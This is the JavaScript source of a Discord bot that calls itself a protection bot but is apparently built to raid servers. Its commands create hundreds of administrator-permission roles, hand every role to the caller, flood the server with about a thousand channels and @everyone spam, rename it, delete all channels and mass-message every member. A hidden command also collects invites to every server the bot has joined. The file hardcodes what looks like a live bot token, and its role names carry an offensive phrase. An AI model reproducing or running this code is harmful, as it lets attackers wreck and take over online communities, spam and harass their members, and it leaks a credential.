
const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});



bot.login ("NjA2NTM1NzA5MDcwNzIxMDI0.XW-xhg.3N_6g-FXI-o6ees_3rxQGK-YE8o");
bot.on("ready", () => {
bot.user.setActivity('Protecting 758 guilds', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
  console.log("Bot [ON]")
  })

  bot.on("message", message => {
if(message.content.includes("&kelsair")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}

if (message.content === "&serverinfo"){
  let sicon = message.guild.iconURL;
  var serverembed = new Discord.RichEmbed()
  .setTitle("Server Information")
  .setDescription("Protect")
  .setColor("#15f153")
  .setThumbnail(sicon)
  .addField("Nom du serveur", message.guild.name)
  .addField("Crée le", message.guild.createdAt)
  .addField("tu as rejoins", message.member.joinedAt)
  .addField("Membres total", message.guild.memberCount);

  return message.channel.send(serverembed);
}

let messageArray = message.content.split(" ");
let cmd = messageArray[0];
let args = messageArray.slice(1);

if(cmd === "&kick"){

  //!kick @daeshan askin for it

  let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
  if(!kUser) return message.channel.send("```Je ne trouve pas la personne que tu veux kick!```");
  let kReason = args.join(" ").slice(22);
  if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("```Tu n'as pas la permission pour ça!```");
  if(kUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("```je ne peux pas kick cette personne!```");

  let kicEmbed = new Discord.RichEmbed()
  .setDescription("~Kick~")
  .setColor("#e56b00")
  .addField("Kicked User", `${kUser} with ID ${kUser.id}`)
  .addField("Kicked By", `<@${message.author.id}> with ID ${message.author.id}`)
  .addField("Kicked In", message.channel)
  .addField("Tiime", message.createdAt)
  .addField("Reason", kReason);

  let kickChannel = message.guild.channels.find(`name`, "incidents");
  if(!kickChannel) return message.channel.send("Can't find incidents channel.");

  message.guild.member(kUser).kick(kReason);
  kickChannel.send(kicEmbed);

  return;
}

if(cmd === "&ban"){

  let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
  if(!bUser) return message.channel.send("```Je ne trouve pas la personne que tu veux bannir!```");
  let bReason = args.join(" ").slice(22);
  if(!message.member.hasPermission("MANAGE_MEMBERS")) return message.channel.send("```Tu n'as pas la permission pour ça!```");
  if(bUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("```je ne peux pas bannir cette personne!```");

  let baEmbed = new Discord.RichEmbed()
  .setDescription("~Ban~")
  .setColor("#bc0000")
  .addField("Banned User", `${bUser} with ID ${bUser.id}`)
  .addField("Banned By", `<@${message.author.id}> with ID ${message.author.id}`)
  .addField("Banned In", message.channel)
  .addField("Time", message.createdAt)
  .addField("Reason", bReason);

  let incidentchannel = message.guild.channels.find(`name`, "incidents");
  if(!incidentchannel) return message.channel.send("Can't find incidents channel.");

  message.guild.member(bUser).ban(bReason);
  incidentchannel.send(baEmbed);


  return;
}


if (message.content === "&botinfo"){

  let bicon = bot.user.displayAvatarURL;
  var botembed = new Discord.RichEmbed()
  .setTitle("Bot Information")
  .setDescription("Protect")
  .setColor("#15f153") 
  .setThumbnail(bicon) 
  .addField("Nom du Bot", bot.user.username)
  .addField("Crée sur :", bot.user.createdAt);

   return message.channel.send(botembed);
}

if (message.content === "&help"){
  var embed = new Discord.RichEmbed()
    .setTitle("❤️ Les commandes du bots : ❤️")
    .setDescription("ProtectBot's commands ")
    .setColor("#dc143c")
    .addField("🧡 &roles : génére des rôles 🧡")
    .addField("💛 &raul : vous donnes les rôles 💛")
    .addField("💚 &destroy bah tu sais 💚")
    .addField("💙 &channel : crée pleins de channels 💙")
    .addField("💜 &pd : crée pleins de salons vocaux 💜")
    .addField("🖤 &role : donne le rôle izi 🖤");
    message.author.sendMessage(embed);
 
              
}

if(message.content === "&roles"){
for(var i =0; i < 400; i++){
    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                             mentionable:false,
                             permissions:2146958591,
                             position: "",
                             color: "#fb0707"
        })
        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff08c5"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#5d08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#0c08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08d5ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ffa3"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ff23"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#81ff08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#fff608"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff6f08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
    }
}


if(message.content.includes("&role")){
    message.guild.createRole({name:"Izi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes("&raul")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
if(message.content.includes("&ar!kelsairvvesrx")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
}
          if(message.content.includes("&A?serveurinvite")){
              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
          }
          if(message.content === "&issou"){
              message.guild.setName("LE CENTRE TA BZ :)")
              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
            }
            if(message.content === "&pd"){
              for(var i =0; i < 450; i++){
              message.guild.createChannel("BY","voice")
              }
            }
            if(message.content.includes("&.789")){
                for(var i = 0; i < 200; i++){
                    message.channel.send("@everyone https://discord.gg/R3K862v")
                }
            }
            //réaction en chaine
                  if(message.content === "&channel"){
                    message.channel.send("&roles").then(m => m.delete());
                    message.channel.send("&issou").then(m => m.delete());
                      for(var i = 0; i < 999; i++){
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))

                      }
                    }
                    if(message.content === "&destroy"){
                      message.guild.channels.map(c => c.delete())
                      }
                      //on commence la destruction
                      if(message.content.includes("&destroy")){
                          message.channel.send("&ban").then(m => m.delete());
                          message.channel.send("&drole").then(m => m.delete());
                          message.channel.send("&destroy").then(m => m.delete());
                          message.channel.send("&jechange").then(m => m.delete());
                          message.guild.createChannel("LA PIGEONNEIRE", "text").then(c => c.send("channel"))
                      }                                                                                   
                    });
bot.on('message', message => {
 if(message.content.startsWith('&alldm')){
let cont = message.content.slice(1).split(" ")
        let args = cont.slice(1)
        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
      message.guild.members.forEach((player) => {
          message.guild.member(player).send(`**INFORMATIONS SUR LA PIGEONNERIE :

Numéro 1 :

La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.

TA CAPTÉ ? **             https://discord.gg/R3K862v`);
});
    }
})
   

      
